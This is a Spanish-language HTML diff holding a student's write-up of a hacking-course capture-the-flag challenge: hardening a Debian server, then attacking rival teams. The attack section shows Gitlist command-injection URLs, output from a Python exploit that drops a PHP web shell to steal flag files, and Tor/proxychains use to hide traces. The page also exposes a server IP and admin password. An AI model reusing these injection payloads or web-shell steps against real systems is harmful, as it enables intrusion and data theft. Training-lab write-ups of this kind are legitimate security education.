@@ -5,6 +5,286 @@
 
 <h2>El Reto</h2>
 
+<p>El RETO de #moocHackingMU se desarrollará en dos fases:</p>
+
+<p>
+    <b>1ª fase:</b> se forman equipos de 8 personas.  Se proporcionará a cada equipo acceso a un VPS con un servidor web preinstalado y una página web simple (en cuanto a diseño y funcionalidad) pero completa en lo que a proporcionar mecanismos para que pueda ser atacada se refiere.
+</p>
+<p>
+    <b>2ª fase:</b> Durante esta segunda fase se harán públicos los sitios web de cada equipo y se pasará a la fase de "ataque". Los equipos, además de detectar vulnerabilidades de otros equipos y guardar evidencias de ello, tendran que evitar ataques por parte de otros equipos.
+</p>
+
+<h3>Servidor proporcionado</h3>
+<p>
+Dirección IP del servidor: 45.55.93.161<br>
+Contraseña del usuario admin: 24472b0b41e6fccfaea0de349afebb6d<br>
+El servidor es una máquina Debian Wheezy de 32 bits i686 en modo solo texto. Para acceder debe usarse SSH (no tiene telnet instalado).<br>
+</p>
+
+<pre>
+nmap -sV -A 45.55.93.161 -Pn -p 21,22,80
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-09-29 11:24 CEST Nmap scan report for 45.55.93.161
+Host is up (0.14s latency).
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r-- 1 0 0 1026 Oct 05 2015 mooc-hacking-team-0011-level-02.gpg 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey:
+THE FORCE OF HACK
+ | 1024 9a:b6:6f:84:a3:2c:0e:5b:6c:c4:bc:31:6d:ad:ff:a4 (DSA)
+| 2048 e6:9a:51:f9:4f:cb:91:72:68:4a:48:b8:16:da:4c:fb (RSA)
+|_ 256 a1:b1:f4:c8:53:d6:3e:20:6e:ce:71:ee:45:d1:97:66 (ECDSA) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: #moocHackingMU Sitio web para el reto final
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+
+<p>El software proteger sera:</p>
+<p>- Gitlist: Versión actual 0.3.0</p>
+<p>- Cacti: Versión actual 0.8.8b</p>
+
+<p>Se localizan los archivos a proteger en el servidor:</p>
+
+<pre>
+root@team-0011:~# find / -name "mooc-hacking-team-*-level-*.gpg"
+/srv/ftp/mooc-hacking-team-0011-level-02.gpg
+/usr/share/doc/base-files/mooc-hacking-team-0011-level-01.gpg
+/var/lib/mysql/mooc-hacking-team-0011-level-03.gpg
+</pre>
+
+<h3>Fase 1</h3>
+<p>En esta primera fase se toman y llevan a cabo las siguientes decisiones:</p>
+
+<p>- Web customizada con un avatar que nos represente, un nombre de "guerra" y una frase que nos describa.</p>
+
+<p>
+    <a href="/course/index.html" target="_blank">
+        <img src="/static/build/media/img/u3/index.png" alt="index">
+    </a>
+</p>
+
+<h4>Sistema operativo</h4>
+
+<p>- Dar de alta usuario con permisos de root y bloquear cuenta root</p>
+<p>- Modificación de archivo login.defs, archivo de configuración de directivas locales y de seguridad.</p>
+<p>- Aplicar una actualización del sistema operativo, update & upgrade</p>
+<p>- Se elimina el acceso a root desde ssh</p>
+<p>- Se configura el firewall, instalando el paquete de iptables-persistent. Se opta a tomar una política por defecto de bloqueo y se va abriendo según necesidad:<br>
+<ol>
+    <li>Se decide dejar abierto los servicios smtp. ftp, http y mysql puesto que venían con la instalación.</li>
+    <li>Se limita el número de conexiones por ip.</li>
+    <li>Se toma la decisión de no bloquear ipv6.</li>
+</ol>
+</p>
+
+<h4>Apache</h4>
+
+<p>- Cambiar el banner del servidor Web para que no sea detectado</p>
+<p>- Desactivar el listado de directorios</p>
+<p>- Instalar  modsecurity, firewall a nivel de aplicación</p>
+<p>- Instalar  Mod_evasive  para evitar DDoS</p>
+<p>- Deshabilitar enlaces simbólicos</p>
+<p>- Con modsecurity se configuran reglas contra SQL-Inyection y XSS</p>
+
+<h4>MySQL</h4>
+
+<p>- Se cambia la clave a root.</p>
+<p>- Se comprueban las tablas de las BBDD</p>
+<p>- Procedemos a cambiar la clave del usuario cacti.</p>
+<p>- Se comprueba las bases de datos y usuarios de las mismas</p>
+
+<h4>VSFTP</h4>
+
+<p>Modificar el usuario root de FTP y modificar sftpd.LIST</p>
+<p>Eliminar el acceso anónimo al ftp que expone un gpg.</p>
+<p>Enjaulado usuarios</p>
+<p>Crear "usuarioftp", un usuario sin permisos de llegar al directorio raiz</p>
+
+<h4>GITLIST</h4>
+<p>Vulnerabilidades detectadas CVE-2014-4511, CVE-2014-5023 y CVE-2013-7392</p>
+<p>Para solucionar este problema en nuestro servidor, creamos un script simple en php que detecta el uso de comillas en la url, si esto sucede entendemos que es un ataque y redireccionamos la petición a una página 404.
+Todo la ejecución de código de Gitlist se redirige mediante el archivo .htaccess al archivo index.php, con lo cual incluimos nuestro script al principio de ese archivo:
+</p>
+<pre>
+require_once('theforceofhack.php');
+</pre>
+<p>
+El contenido del archivo "theforceofhack.php"  es el siguiente:
+<iframe src="//pastebin.com/embed_iframe/ieNYJ15Q" height="500px" style="border:none;width:100%;margin-top:20px;"></iframe>
+</p>
+
+<p>Redirección a:</p>
+
+<p>
+    <a href="/course/404.html" target="_blank">
+        <img src="/static/build/media/img/u3/404.png" alt="404">
+    </a>
+</p>
+
+<h4>CACTI</h4>
+    <p>La versión  0.8.8b  instalada presenta múltiples vulnerabilidades:<br>
+    <a href="https://web.nvd.nist.gov/view/vuln/search-results?query=cacti+0.8.8b&search_type=all&cves=on">https://web.nvd.nist.gov/view/vuln/search-results?query=cacti+0.8.8b&search_type=all&cves=on</a>
+</p>
+<p>
+    Decidimos actualizar a la última versión 0.8.8h:<br>
+    <a href="https://web.nvd.nist.gov/view/vuln/search-results?query=cacti+0.8.8h&search_type=all&cves=on">https://web.nvd.nist.gov/view/vuln/search-results?query=cacti+0.8.8h&search_type=all&cves=on</a>
+</p>
+<p>
+    Proceso de actualización de 0.8.8b a versión 0.8.8h manteniendo los datos de clientes existentes:
+</p>
+<p>
+Crear backup:
+</p>
+<pre>
+root@team-0011:/# cd /usr/share/cacti
+root@team-0011:/usr/share/cacti# mkdir dbbackup
+root@team-0011:/usr/share/cacti# cd dbbackup root@team-0011:/usr/share/cacti/dbbackup# mysqldump -uroot -p -l --add-drop-table cacti > mysql.cacti.sql
+</pre>
+<p>Comprobar backup:</p>
+<pre>
+root@team-0011:/usr/share/cacti/dbbackup# ls
+mysql.cacti.sql
+root@team-0011:/usr/share/cacti/dbbackup# nano mysql.cacti.sql
+</pre>
+<p>Descargar nueva version y descomprimir:</p>
+<pre>
+root@team-0011:/usr/share/cacti/dbbackup# cd ..
+root@team-0011:/usr/share/cacti# wget http://www.cacti.net/downloads/cacti-0.8.8h.tar.gz root@team-0011:/usr/share/cacti# tar xzvf cacti-0.8.8h.tar.gz
+</pre>
+<p>Editar datos de conexión de la base de datos:</p>
+<pre>
+root@team-0011:/usr/share/cacti# nano cacti-0.8.8h/include/config.php
+</pre>
+<p>Copiar archivos necesarios:</p>
+<pre>
+root@team-0011:/usr/share/cacti# cp -u site/scripts/* cacti-0.8.8h/scripts/ root@team-0011:/usr/share/cacti# cp -u -R site/resource/* cacti-0.8.8h/resource/
+</pre>
+<p>Renombrar las carpetas para acceder a la nueva instalación:</p>
+<pre>
+root@team-0011:/usr/share/cacti# mv site site_old root@team-0011:/usr/share/cacti# mv cacti-0.8.8h site
+</pre>
+<p>Ir a http://45.55.93.161/cacti/index.php y seguir las instrucciones.</p>
+
+<p><img src="/static/build/media/img/u3/1.png" alt="cacti-update"></p>
+<p><img src="/static/build/media/img/u3/2.png" alt="cacti-update"></p>
+<p><img src="/static/build/media/img/u3/3.png" alt="cacti-update"></p>
+<p><img src="/static/build/media/img/u3/4.png" alt="cacti-update"></p>
+<p><img src="/static/build/media/img/u3/5.png" alt="cacti-update"></p>
+<p><img src="/static/build/media/img/u3/6.png" alt="cacti-update"></p>
+
+<p>+Info: <a href="http://www.cacti.net/downloads/docs/html/upgrade.html">http://www.cacti.net/downloads/docs/html/upgrade.html</a></p>
+
+<h3>FASE 2: ATAQUE</h3>
+
+<p>- Análisis de todos los servidores de los equipos con nmap.</p>
+<p>- Uso de metasploit y diferentes exploits contra varios servicios, no se logran encontrar vulnerabilidades.</p>
+<p>- A través de las vulnerabilidades de GITLIST se logran los siguientes archivos:</p>
+
+<p><img style="width:400px" src="/static/build/media/img/u3/files.png" alt="files"></p>
+
+<p>El método empleado es el siguiente:</p>
+
+<p>
+Este método utiliza una vulnerabilidad de Gitlist, la cual permite ejecutar comandos por Url, ejemplo:<br>
+<br><b><i>http://159.203.114.191/gitlist/demo-repository/blob/master/%60ls%20-la%60.md</i></b><br><br>
+Además es posible escribir en la carpeta “cache” de Gitlist, la cual es accesible por Url. Para sacar los archivos level-01 y level-02 podríamos ejecutar en para url:<br>
+<br><b><i>“find / -name "mooc-hacking-team-*-level-*.gpg"</i></b>
+</p>
+
+<p>
+<br><b><i>http://159.203.114.191/gitlist/demo-repository/blob/master/%60find%20/%20-name%20%22mooc-hacking-team-*-level-*.gpg%22%60.md</i></b><br><br>
+Con esto tendríamos el nombre y la ubicación de los archivos y mediante un simple “cat” podríamos ver su contenido. El fichero level-03 no podríamos verlo de esta manera ya que no tenemos permisos para leerlo en la ubicación en la que está “/var/lib/mysql”, entendemos que para verlo necesitamos permisos de un usuario de MySql. Usaremos en usuario de la aplicación Cacti para ello.
+Para facilitar la búsqueda y descarga de archivos creamos nuestro propio script en php:
+</p>
+
+<p>
+    <iframe height="2000px" src="//pastebin.com/embed_iframe/dX5e5H2a" style="border:none;width:100%"></iframe>
+</p>
+
+<p>
+Nos permite una búsqueda automática de los archivos y la descarga del fichero level-03 mediante el usuario “cacti” a través de una tabla temporal que creamos en MySql.
+Pasamos el script en php a base64 y usamos el siguiente script en Python para subirlo a la carpeta “cache” de Gitlist:
+</p>
+
+<p>
+<iframe height="1050px" src="//pastebin.com/embed_iframe/7nDkSR6G" style="border:none;width:100%"></iframe>
+</p>
+
+<p>
+El exploit crea el archivo en disco y lo convierte de base64 a formato normal, ejemplo de ejecución:
+</p>
+
+<pre>
+$ python exploit.py http://159.203.114.191/gitlist/demo-repository /var/www/html/gitlist/cache
+[!] Using cache location /var/www/html/gitlist/cache
+[!] Shell dropped; go hit http://159.203.114.191/gitlist/cache/hack.php?cmd=ls
+</pre>
+
+<p>
+El script php está preparado para recibir un parámetro “search” que facilita la descarga de los archivos, ejemplo:
+<br><br><b><i>http://159.203.114.191/gitlist/cache/hack.php?cmd=search</i></b><br>
+</p>
+
+<p><img style="width:500px" src="/static/build/media/img/u3/example.png" alt="example"></p>
+
+<p>
+Para realizar este ataque, ejecutamos el exploit en Python con <b>“Proxychains”</b> a través de la red <b>“Tor”</b>, una vez subido el archivo php, accedemos a él mediante el navegador <b>“Tor”</b>. Cuando hemos acabado de descargar los archivos eliminamos el script en php mediante un parámetro “remove” que hemos preparado en el script:
+<br><br><b><i>http://159.203.114.191/gitlist/cache/hack.php?cmd=remove</i></b><br><br>
+Así intentamos dejar el mínimo rastro posible.
+</p>
+
+<p>
+    Para uno de los equipos tuvimos que cambiar un poco el método, podíamos subir el script php mediante el exploit python pero no acceder a él por url,
+    como podiamos seguir ejecuante comandos a través de GitList, pudimos descar los archivos de level-01 y level-02 con un simple “cat” y variamos el script en php para poder ejecutarlo directamente con el interprete de php.
+    Subimos este script:
+</p>
+
+<p>
+    <iframe height="950px" src="//pastebin.com/embed_iframe/QsLxef7X" style="border:none;width:100%"></iframe>
+</p>
+
+<p>
+    y lo ejecutamos de la siguiente manera para sacar el level-03:
+</p>
+
+<p><img src="/static/build/media/img/u3/hack.png" alt="hack"></p>
+
+<h3>Ataques recibidos</h3>
+
+<p>En la segunda fase, no hemos detectado indicios de robo de nuestro archivos gpg.</p>
+<p>
+    Hemos monitorizado los siguiente:<br><br>
+    - Intentos de conexión al servidor ftp con múltiples usuarios.<br>
+    - Intentos de acceso por ssh con múltiples usuarios.<br>
+    - No se ha detectado actividad en el servidor Mysql.<br>
+    - Los principales ataques han sido contra gitlist, intentando explotar la vulnerabilidad de este servicio, sin impacto.
+</p>
+
+<h3>Mi aporte al grupo:</h3>
+
+<p>- Ser designado como enlace entre el grupo y el curso</p>
+<p>- Creación de web del equipo</p>
+<p>- Creación de script de protección del GITLIST</p>
+<p>- Creación de página 404 para redirección del script anterior</p>
+<p>- Actualización de CACTI</p>
+<p>- Creación de scripts de PHP para ataques a GITLIST</p>
+<p>- Ataques y descarga de archivos gpg</p>
+<p>- Monitorización de Apache para descubrimiento de ataques</p>
+<p>- Participación activa en el grupo y toma de decisiones</p>
+
+<h3>Experiencia:</h3>
+<p>
+Analizando el curso globalmente, la participación ha sido <b>positiva</b>.
+La parte que más me ha gustado ha sido "El reto", ya que entras en contacto
+con más gente y puedes aprender de otras personas, lo cual siempre es enriquecedor.
+</p>
+<p>
+Como punto negativo comentar que el feedback por parte de los organizadores del curso es muy bajo.
+No existe manera de preguntar dudas etc..., esto es comprensible ya que el curso es gratituo y abierto a todo el mundo, para aprender dependes un poco de ti mismo, y en la
+última fase, de los compañeros con los que formes en grupo y su implicación.<br>
+</p>
+
+
 {{> course/links }}
 
 {{/ content}}
